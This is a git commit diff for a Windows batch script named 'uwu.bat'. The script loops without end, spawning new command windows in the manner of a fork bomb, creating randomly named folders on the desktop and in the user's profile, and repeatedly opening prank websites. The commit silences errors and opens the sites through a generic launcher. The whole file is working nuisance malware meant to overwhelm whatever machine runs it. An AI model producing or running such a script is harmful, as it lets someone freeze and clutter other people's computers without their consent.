bce03d1a647d948defa7b9c0b15cff96a1ff55da
XD_BYTE <84959276+XDBYTE@users.noreply.github.com>
2021-11-18 00:16:37 +0530

    Update uwu.bat

--- uwu.bat
+++ uwu.bat
@@ -2,11 +2,8 @@
 :top
 start
 title MEOW
-powershell -c "Invoke-WebRequest -Uri 'https://cataas.com/cat' -OutFile '%USERPROFILE%\Desktop\Cat->%random%.png'"
-md "%USERPROFILE%\Desktop\MEOW-%random%"
+md "%USERPROFILE%\Desktop\MEOW->%random%"
 md "%USERPROFILE%\%random%"
-start chrome https://piv.pivpiv.dk/
-start microsoft-edge https://piv.pivpiv.dk/
-start chrome https://youareanidiot.cc/
-start microsoft-edge https://youareanidiot.cc/
+2>NUL start "" https://piv.pivpiv.dk/
+2>NUL start "" https://youareanidiot.cc/
 goto top
